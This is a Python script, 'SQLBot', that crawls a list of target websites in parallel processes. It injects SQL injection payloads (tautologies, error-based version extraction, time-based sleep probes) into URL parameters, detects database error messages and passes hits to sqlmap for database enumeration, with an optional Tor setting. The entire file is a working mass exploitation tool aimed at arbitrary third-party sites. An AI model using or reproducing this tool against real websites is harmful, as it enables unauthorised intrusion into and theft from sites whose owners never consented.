#!/usr/bin/python3
# -*- coding: utf-8 -*-
#
import urllib.request,urllib,time,random,os,subprocess,requests
import sys,socket
from urllib.parse import urljoin
from urllib.parse import urlparse
from termcolor import colored
import colorama
colorama.init()
from bs4 import BeautifulSoup
from bs4 import XMLParsedAsHTMLWarning
import warnings
warnings.filterwarnings("ignore", category=XMLParsedAsHTMLWarning)
import multiprocessing as mp
from colorama import init, Fore, Style
init(autoreset=True)
import urllib3
import sqlite3
import tempfile
import shutil
import psutil
from datetime import datetime
from pathlib import Path
#############################################################################################
### Logo
#############################################################################################
global logo
logo = '''
:'######::'#######:'##::::::'########::'#######:'########:
'##... ##'##.... ##:##:::::::##.... ##'##.... ##... ##..::
 ##:::..::##:::: ##:##:::::::##:::: ##:##:::: ##::: ##::::
. ######::##:::: ##:##:::::::########::##:::: ##::: ##::::
:..... ##:##:'## ##:##:::::::##.... ##:##:::: ##::: ##::::
'##::: ##:##:.. ##::##:::::::##:::: ##:##:::: ##::: ##::::
. ######:. ##### ##:########:########:. #######:::: ##::::
:......:::.....:..:........:........:::.......:::::..:::::
Coded By SourceCode347
'''
###########################################################################################
### Settings
###########################################################################################
global eqbool,cbool,torbool,errorbool,output, \
SQLMAP_API_URL,USERNAME,PASSWORD,SQLMAPAPI_PATH,HOST,PORT
HOST = "127.0.0.1"
PORT = "8775"
SQLMAP_API_URL = f"http://{HOST}:{PORT}"
USERNAME = "AdminBaz"
PASSWORD = "SQLMap347Baz"
SQLMAPAPI_PATH = "D:/0/hack/sqlmap/sqlmapapi.py"
output="vulnerabilities.txt"
processes=int(int(mp.cpu_count())/2)
torbool=False
errorbool=False
############################################################################################
### Args
###########################################################################################
for arg in range(0,len(sys.argv)):
    if sys.argv[arg-1]=="-p" or sys.argv[arg-1]=="--processes":
        processes=int(sys.argv[arg])
    if sys.argv[arg-1]=="-t" or sys.argv[arg-1]=="--targets":
        targets=str(sys.argv[arg])
    if sys.argv[arg-1]=="-o" or sys.argv[arg-1]=="--output":
        output=str(sys.argv[arg])
    if sys.argv[arg-1]=="--tor":
        torbool=True
    if sys.argv[arg-1]=="--error":
        errorbool=True
    if sys.argv[arg-1]=="-h" or sys.argv[arg-1]=="--help":
        print(colored(logo, "green"))
        help = '''
        +------------------+------------------------------------------+---------------------------+
        | Argument         | Info                                     | Default                   |
        +------------------+------------------------------------------+---------------------------+
        | -h , --help      | Printing Help Of Arguments               | NULL                      |
        +------------------+------------------------------------------+---------------------------+
        | -p , --processes | Integer Of Processes ( e.g -p 8 )        | CPU Threads / 2           |
        +------------------+----------------------------------------------------------------------+
        | -t , --targets   | File list of website targets             | targets.txt               |
        +------------------+----------------------------------------------------------------------+
        | -o , --output    | Output File Of Vulnerabilities           | vulnerabilities.txt       |
        +------------------+----------------------------------------------------------------------+        
        | --tor            | Enable Tor on SQLMap if Tor Browser Run  | False                     |
        +------------------+----------------------------------------------------------------------+
        | --error          | Printing Errors to Console               | False                     |
        +------------------+----------------------------------------------------------------------+
        | Example Command  | python sqlbot.py -p 16 -t targets.txt                                |
        +-----------------------------------------------------------------------------------------+
        '''
        print(Fore.GREEN +f"{help}")
        sys.exit()
##############################################################################################
### Small Functions
##############################################################################################
def filecreator(file_name):
    if not os.path.exists(file_name):
        with open(file_name, "w", encoding="utf-8") as f:
            f.write("")
filecreator(output)
def saveurl(tl):
    domain = urlparse(tl).netloc
    with open(output,"a") as f:
        if domain not in open(output).read():   
            f.write(tl+"\n")
        f.close()
def processnamefix(pname):
    if len(pname)==9:
        return pname+" "
    elif len(pname)==8:
        return pname+"  "
    else:
        return pname
def fixstrlen(s):
    while len(s)<=8:
        s+=" "
    return s
def getnow():
    return datetime.now().strftime("%H:%M:%S")
def domaincleaner(domain):
    if domain.startswith("http://"):
        domain = domain[7:]
    elif domain.startswith("https://"):
        domain = domain[8:]
    if domain.startswith("www."):
        domain = domain[4:]
    return domain.replace("/","")
def filechecker(file: str) -> bool:
    if not file:
        return False
    return os.path.isfile(file)  
#################################################################################################
#### SQLMap Functions
#################################################################################################
def kill_sqlmapapi():
    print(Fore.CYAN+f"[{getnow()}] "+Fore.RED + "[*] Try to Killing existing sqlmapapi process...")
    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
        try:
            if proc.info['name'] and 'sqlmapapi' in proc.info['name'].lower() or \
               proc.info['cmdline'] and any('sqlmapapi' in str(x) for x in proc.info['cmdline']):
                proc.kill()
                print(Fore.CYAN+f"[{getnow()}] "+Fore.RED + f"[*] Killed sqlmapapi (PID: {proc.pid})")
        except:
            pass
    time.sleep(2)
def start_sqlmap_server():
    try:
        if filechecker(SQLMAPAPI_PATH) == False:
            print(Fore.CYAN+f"[{getnow()}] "+Fore.RED + f"[*] sqlmapapi path is wrong : {SQLMAPAPI_PATH}")
    except:
        pass
    try:
        r = requests.get(f"{SQLMAP_API_URL}/task/new", auth=(USERNAME, PASSWORD), timeout=2)
        if r.status_code == 200:
            print(Fore.CYAN+f"[{getnow()}] "+Fore.YELLOW + "[!] SQLMap API Server is already running.")
            print(Fore.CYAN+f"[{getnow()}] "+Fore.RED + "[*] Killing existing sqlmapapi process...")
            # === Kill existing sqlmapapi ===
            try:
                kill_sqlmapapi()
            except:
                pass
            time.sleep(2)

    except:
        pass
    cmd = [
        "python", SQLMAPAPI_PATH,
        "-s", "-H", HOST, "-p", PORT,
        "--username", USERNAME,
        "--password", PASSWORD
    ]
    try:
        subprocess.Popen(cmd,
                         stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL,
                         creationflags=subprocess.CREATE_NEW_PROCESS_GROUP)  # Windows
        if filechecker(SQLMAPAPI_PATH) == True:
            print(Fore.CYAN+f"[{getnow()}] "+"SQLMap API Server Starts at Background.")
        else:
            print(Fore.CYAN+f"[{getnow()}] "+Fore.RED + f"SQLMap API Server Failed to Start.")
        time.sleep(3)
    except Exception as e:
        print(Fore.CYAN+f"[{getnow()}] "+Fore.RED + f"Error SQLMap API Server : {e}")
        sys.exit()
def sqlmap(url, pname, max_seconds=1500):
    taskid = None
    try:
        auth = (USERNAME, PASSWORD)
        r = requests.get(f"{SQLMAP_API_URL}/task/new", auth=auth, timeout=10)
        taskid = r.json().get('taskid')
        if not taskid:
            print(Fore.CYAN+f"[{getnow()}] "+Fore.RED + f"[{Fore.GREEN +pname +Fore.CYAN}] [{Fore.YELLOW + fixstrlen('SQLMap') +Fore.CYAN}] "+Fore.RED + f"Τask Failed to Start (!)")
            return False
        print(Fore.CYAN+f"[{getnow()}] "+Fore.WHITE + f"[{Fore.GREEN +pname +Fore.CYAN}] [{Fore.YELLOW + fixstrlen('SQLMap') +Fore.CYAN}] Task ID: {Fore.WHITE+taskid}")
        if torbool==True:
            options = {
                "url": url,
                "batch": True,
                "ignoreRedirects": True,
                "tor": True,
                "verbose": 1,
                "level": 3,
                "risk": 2
            }
        else:
            options = {
                "url": url,
                "batch": True,
                "ignoreRedirects": True,
                "verbose": 1,
                "level": 3,
                "risk": 2
            }
        requests.post(f"{SQLMAP_API_URL}/option/{taskid}/set", json=options, auth=auth)
        start_data = {"getDbs": True}
        requests.post(f"{SQLMAP_API_URL}/scan/{taskid}/start", json=start_data, auth=auth)
        print(Fore.CYAN+f"[{getnow()}] "+Fore.WHITE+ f"[{Fore.GREEN +pname +Fore.CYAN}] [{Fore.YELLOW + fixstrlen('SQLMap') +Fore.CYAN}] Analyzing URL : {Fore.YELLOW +url}")
        start_time = time.time()
        last_log_id = 0
        while True:
            elapsed = time.time() - start_time
            if elapsed > max_seconds:
                requests.get(f"{SQLMAP_API_URL}/scan/{taskid}/stop", auth=auth)
                break
            status_resp = requests.get(f"{SQLMAP_API_URL}/scan/{taskid}/status", auth=auth, timeout=10)
            status = status_resp.json().get("status")
            if int(elapsed) % 30 == 0:
                print(Fore.CYAN+f"[{getnow()}] "+Fore.YELLOW + f"[{Fore.GREEN +pname +Fore.CYAN}] [{Fore.YELLOW + fixstrlen('SQLMap') +Fore.CYAN}] Status: {Fore.WHITE+status+Fore.CYAN} | {Fore.WHITE + str(int(elapsed))}s")
            if status in ['terminated', 'stopped']:
                print(Fore.CYAN+f"[{getnow()}] "+Fore.GREEN + f"[{Fore.GREEN +pname +Fore.CYAN}] [{Fore.YELLOW + fixstrlen('SQLMap') +Fore.CYAN}] Scan Completed")
                break
            time.sleep(2)
        data = requests.get(f"{SQLMAP_API_URL}/scan/{taskid}/data", auth=auth).json()
        log = requests.get(f"{SQLMAP_API_URL}/scan/{taskid}/log", auth=auth).json()
        time.sleep(2)
        output_text = str(data).lower() + str(log).lower()
        #print(Fore.CYAN+f"[{getnow()}] "+Fore.WHITE +f"[{Fore.GREEN +pname +Fore.CYAN}] [{Fore.YELLOW + fixstrlen('SQLMap') +Fore.CYAN}] {output_text}")
        output_text = str(output_text)
        vulnerable=False
        if "available databases" in output_text or ("fetching database names" in output_text and "'dbs', 'value':" in output_text) \
            or "'information_schema'" in output_text  or "'master'" in output_text:
            vulnerable=True
        if vulnerable:
            print(Fore.CYAN+f"[{getnow()}] "+Fore.GREEN + f"[{Fore.GREEN +pname +Fore.CYAN}] [{Fore.YELLOW + fixstrlen('SQLMap') +Fore.CYAN}] Vulnerable URL : {Fore.GREEN+url}")
            saveurl(url)
            return True
        else:
            print(Fore.CYAN+f"[{getnow()}] "+Fore.RED + f"[{Fore.GREEN +pname +Fore.CYAN}] [{Fore.YELLOW + fixstrlen('SQLMap') +Fore.CYAN}] Not Vulnerable URL : {Fore.RED+url}")
    except Exception as e:
        print(Fore.CYAN+f"[{getnow()}] "+Fore.RED + f"[{Fore.GREEN +pname +Fore.CYAN}] [{Fore.YELLOW + fixstrlen('SQLMap') +Fore.CYAN}] "+Fore.RED +f"Error : {e}")
        if taskid:
            try:
                requests.get(f"{SQLMAP_API_URL}/task/{taskid}/delete", auth=auth)
            except:
                pass
        return False
#############################################################################################
### ModernSQLiSpider
#############################################################################################
# payloads (error, time-based, blind)
PAYLOADS = [
    "'",
    "\"", 
    "1' OR '1'='1",
    "1\" OR \"1\"=\"1",
    "' OR '1'='1' --",
    "1 AND 1=1",
     "1' AND 1=1 --",

    "')",
    '")',
    "'))",
    '"))',
    "';--",
    '";--',
    "' OR 1=1--",
    "admin'--",

    "') OR ('1'='1",
    "admin' OR '1'='1",
    "1' OR 1=1 LIMIT 1--",

    "' AND (SELECT COUNT(*) FROM information_schema.tables GROUP BY CONCAT(version(),FLOOR(RAND(0)*2))) HAVING MIN(0) OR 1--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--",
    "1' AND CAST((SELECT @@version) AS INT)--",
    "' HAVING 1=1--",

    "'; WAITFOR DELAY '0:0:5'--",
    "SLEEP(5)--",
    "'IF(1=1,SLEEP(5),0)--",
    "'pg_sleep(5)--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
]

ERROR_SIGNS = [
    "sql syntax", 
    "mysql_fetch",
    "unclosed quotation mark",
    "ORA-", 
    "PostgreSQL query failed",

    'You have an error in your SQL syntax',
    'Truncated incorrect DOUBLE value',
    'XPATH syntax error',
    'Division by zero',
    'Duplicate entry', 

    'Unclosed quotation mark after the character string',
    'Incorrect syntax near',
    'Conversion failed when converting the varchar value',
    'Microsoft OLE DB Provider for SQL Server error',

    'unterminated quoted string at or near',
    'syntax error at or near',
    'invalid input syntax for integer',

    'SQL command not properly ended',
    'quoted string not properly terminated',
    'FROM keyword not found where expected'
]
class ModernSQLiSpider:
    def __init__(self, start_url, max_depth=3, delay=0.3):
        self.start_url = start_url
        self.max_depth = max_depth
        self.delay = delay
        self.visited = set()
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (compatible; SQLBot/2.0;)"
        })

    def crawl(self, url, pname, depth=0 , spider=False):
        if depth == self.max_depth:
            return
        try:
            if spider==True:
                print(Fore.CYAN +f"[{getnow()}] [{Fore.GREEN +pname +Fore.CYAN}] [{Fore.MAGENTA + fixstrlen('Spider')+Fore.CYAN}] Crawling → {Fore.WHITE + url}")
            d=urlparse(url).netloc
            if str(d).strip()=="":
                d=url
            self.visited.add(domaincleaner(d))
            resp = self.session.get(url, timeout=10)
            if resp.status_code != 200:
                return
            if "?" in url:
                self.test_sql_injection(url, resp , pname)
            soup = BeautifulSoup(resp.text, 'html.parser')
            # find links
            links = soup.find_all("a", href=True)
            random.shuffle(links)
            for link in links:
                next_url = urljoin(url, link['href'].split('#')[0])
                if spider==False:
                    if "?" in next_url and next_url.startswith(('http://', 'https://')):
                        time.sleep(self.delay + random.uniform(0, 1))
                        if next_url!=url:
                            depth+=1
                            if depth%2==0:
                                self.visited.clear()
                                return
                            self.crawl(next_url, pname, depth ,True)
                else:
                    if "?" in next_url and domaincleaner(urlparse(next_url).netloc) not in self.visited and next_url.startswith(('http://', 'https://')):
                        time.sleep(self.delay + random.uniform(0, 1))
                        if next_url!=url:
                            depth+=1
                            if depth%2==0:
                                self.visited.clear()
                                return
                            self.crawl(next_url, pname, depth ,True)
            else:
                return
        except Exception as e:
            if errorbool==True:
                print(Fore.CYAN+f"[{getnow()}] "+Fore.RED + f"[{Fore.GREEN +pname +Fore.CYAN}] "+Fore.RED +f"[-] Error crawling {url}: {e}")
            pass
            return
    def test_sql_injection(self, url, original_resp ,pname):
        """Test GET parameters"""
        parsed = urlparse(url)
        if not parsed.query:
            return
        onevulnpayload=True       
        for payload in PAYLOADS:
            try:
                if onevulnpayload==True:
                    new_url = url.replace(parsed.query, f"{parsed.query}{payload}")
                    resp = self.session.get(new_url, timeout=10)               
                    if any(err in resp.text.lower() for err in ERROR_SIGNS):
                        print(Fore.CYAN+f"[{getnow()}] "+Fore.GREEN + f"[{Fore.GREEN +pname +Fore.CYAN}] [{Fore.BLUE +fixstrlen("Detector")+Fore.CYAN}] [!] Possible SQLi → {Fore.BLUE + new_url}")
                        print(Fore.CYAN+f"[{getnow()}] "+Fore.GREEN + f"[{Fore.GREEN +pname +Fore.CYAN}] [{Fore.BLUE +fixstrlen("Detector")+Fore.CYAN}] [+] Payload : "+Fore.WHITE +f"{payload}")
                        onevulnpayload=False
                        sqlmap(url,pname)
            except Exception as e:
                if errorbool==True:
                    print(Fore.CYAN+f"[{getnow()}] "+Fore.RED + f"[{Fore.GREEN +pname +Fore.CYAN}] "+Fore.RED +f"[-] Error Payload Error {e} \n Payload : {payload}")
                pass
# ====================== WORKER ======================
def worker(worker_id, domain_chunk,pname):
    print(Fore.CYAN+f"[{getnow()}] "+Fore.GREEN + f"[{Fore.GREEN +pname +Fore.CYAN}] Started with {len(domain_chunk)} domains")
    spider = ModernSQLiSpider(None, max_depth=3, delay=0.3)
    for i, domain in enumerate(domain_chunk, 1):
        try:
            print(Fore.CYAN+f"[{getnow()}] "+Fore.CYAN + f"[{Fore.GREEN +pname +Fore.CYAN}] [{Fore.WHITE + fixstrlen(f"{i}/{len(domain_chunk)}")+Fore.CYAN}] Crawling → {Fore.WHITE + domain}")
            spider.crawl(f"https://{domain}" if not domain.startswith("http") else domain , pname)
            time.sleep(0.3)
        except Exception as e:
            print(Fore.CYAN+f"[{getnow()}] "+Fore.RED + f"[{Fore.GREEN +pname +Fore.CYAN}] Error on {domain}: {e}")
    print(Fore.CYAN+f"[{getnow()}] "+Fore.GREEN + f"[{Fore.GREEN +pname +Fore.CYAN}] Finished all assigned domains!")
# ====================== HELPER FUNCTIONS ======================
def load_domains(file_path):
    try:
        with open(file_path, "r", encoding="utf-8") as f:
            domains = [line.strip() for line in f if line.strip() and not line.startswith("#")]
        print(Fore.CYAN+f"[{getnow()}] "+Fore.GREEN + f"[+] Loaded {len(domains):,} domains from {file_path}")
        return domains
    except FileNotFoundError:
        print(Fore.CYAN+f"[{getnow()}] "+Fore.RED + f"[!] File not found: {file_path}")
        sys.exit(1)
    except Exception as e:
        print(Fore.CYAN+f"[{getnow()}] "+Fore.RED + f"[!] Error reading file: {e}")
        sys.exit(1)
def split_domains(domains, num_processes):
    chunk_size = max(1, len(domains) // num_processes)
    chunks = [domains[i:i + chunk_size] for i in range(0, len(domains), chunk_size)]
    return chunks
# ====================== MAIN ======================
if __name__ == "__main__":
    print(colored(logo, "green"))
    time.sleep(3)
    start_sqlmap_server()
    domains_file = targets
    num_processes = processes
    all_domains = load_domains(domains_file)
    domain_chunks = split_domains(all_domains, num_processes)
    print(Fore.CYAN+f"[{getnow()}] "+Fore.GREEN + f"🚀 Starting {num_processes} Processes")
    print(Fore.CYAN+f"[{getnow()}] "+Fore.YELLOW + f"[+] Distributing {len(all_domains):,} domains (~{len(domain_chunks[0])} per process)")
    print(Fore.CYAN+f"[{getnow()}] "+Fore.YELLOW + "[+] Press Ctrl+C to stop...\n")
    time.sleep(2)
    processes_list = []
    for i in range(num_processes):
        p = mp.Process(
            target=worker,
            args=(i+1, domain_chunks[i],processnamefix(f"SQLBot-{i+1}")),
            name=f"SQLBot-{i+1}",
            daemon=True
        )
        p.start()
        processes_list.append(p)
        time.sleep(0.2)
    print(Fore.CYAN+f"[{getnow()}] "+Fore.GREEN + f"✅ All {num_processes} processes started successfully!")
    try:
        while True:
            time.sleep(10)
            pcount=0
            for p in processes_list:
                if p.is_alive():
                    pcount+=1
            if pcount==0:
                # === Kill existing sqlmapapi ===
                try:
                    kill_sqlmapapi()
                except:
                    pass
                break
    except KeyboardInterrupt:
        print(Fore.CYAN+f"[{getnow()}] "+Fore.RED + "\n\n🛑 Stopping all processes...")
        for p in processes_list:
            if p.is_alive():
                p.terminate()
        # === Kill existing sqlmapapi ===
        try:
            kill_sqlmapapi()
        except:
            pass
        print(Fore.CYAN+f"[{getnow()}] "+Fore.GREEN + "All processes terminated.")